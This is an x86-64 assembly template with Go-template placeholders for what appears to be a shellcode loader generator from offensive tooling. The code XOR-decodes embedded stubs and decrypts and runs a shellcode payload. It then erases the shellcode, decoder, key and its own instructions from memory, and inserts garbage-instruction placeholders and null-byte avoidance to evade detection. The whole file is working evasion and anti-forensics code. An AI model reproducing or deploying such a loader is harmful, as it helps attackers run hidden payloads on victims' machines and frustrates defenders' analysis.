.code64

entry:
  // save context and prepare the environment
  {{db .SaveContext}}
  push rbx

  // calculate the entry address
  lea rbx, [rip + entry]

  // save arguments for call shellcode
  push rcx
  push rdx
  push r8
  push r9

  // decode instructions in stub and erase them
  call decode_stubs
  call decode_shellcode
  call erase_decoder_stub
  call erase_crypto_key_stub

  // erase useless functions and entry
 flag_eraser_1:
  lea rcx, [rbx + mini_xor]          {{igi}}
  mov rdx, eraser_stub - mini_xor    {{igi}}
  call eraser_stub                   {{igi}}

  mov rcx, rbx                       {{igi}}
  mov rdx, flag_eraser_1             {{igi}}
  call eraser_stub                   {{igi}}

  // restore arguments for call shellcode
  pop r9                             {{igi}}
  pop r8                             {{igi}}
  pop rdx                            {{igi}}
  pop rcx                            {{igi}}

  // ensure stack is 16 bytes aligned
  push rbp                           {{igi}}
  mov rbp, rsp                       {{igi}}
  mov rax, rbp                       {{igi}}
  and rax, 0x0F                      {{igi}}
  sub rsp, rax                       {{igi}}

  // execute the shellcode
  sub rsp, 0x80                      {{igi}}
  call shellcode_stub                {{igi}}
  add rsp, 0x80                      {{igi}}

  // restore stack and rbp
  mov rsp, rbp                       {{igi}}
  pop rbp                            {{igi}}

  // save the shellcode return value
  push rax                           {{igi}}

  // erase the shellcode stub
{{if .EraseShellcode}}
  lea rcx, [rbx + shellcode_stub]    {{igi}}
  mov rdx, {{hex .ShellcodeLen}}     {{igi}}
  call eraser_stub                   {{igi}}
{{end}}

  // erase the above instructions
 flag_eraser_2:
  mov rcx, rbx                       {{igi}}
  // prevent appear three 0x00
  xor edx, edx                       {{igi}}
  add dx, flag_eraser_2 + 8          {{igi}}
  call eraser_stub                   {{igi}}

  // erase the eraser stub
  lea rdi, [rbx + eraser_stub]       {{igi}}
  lea rsi, [rbx + crypto_key_stub]   {{igi}}
  // prevent appear three 0x00
  xor ecx, ecx                       {{igi}}
  add cx, {{hex .EraserLen}}         {{igi}}
  cld                                {{igi}}
  rep movsb                          {{igi}}

  // restore the shellcode return value
  pop rax                            {{igi}}

  // restore context
  pop rbx                            {{igi}}
  {{db .RestoreContext}}
  ret                                {{igi}}

// rcx = data address, rdx = data length, r8 = key.
// this function assumes that the data length is divisible by 8.
mini_xor:
  shr rdx, 3     // rdx /= 8
  loop_xor:
  xor [rcx], r8
  add rcx, 8
  dec rdx
  jnz loop_xor
  ret

decode_stubs:
  mov r8, {{hex .StubKey}}

  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call mini_xor

  lea rcx, [rbx + eraser_stub]
  mov rdx, crypto_key_stub - eraser_stub
  call mini_xor

  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call mini_xor
  ret

decode_shellcode:
  lea rcx, [rbx + shellcode_stub]
  mov rdx, {{hex .ShellcodeLen}}
  lea r8, [rbx + crypto_key_stub]
  mov r9, {{hex .CryptoKeyLen}}
  sub rsp, 0x40
  call decoder_stub
  add rsp, 0x40
  ret

erase_decoder_stub:
  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call eraser_stub
  ret

erase_crypto_key_stub:
  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call eraser_stub
  ret

decoder_stub:
  {{db .DecoderStub}}                {{igi}}

eraser_stub:
  {{db .EraserStub}}                 {{igi}}

crypto_key_stub:
  {{db .CryptoKeyStub}}              {{igi}}

shellcode_stub:
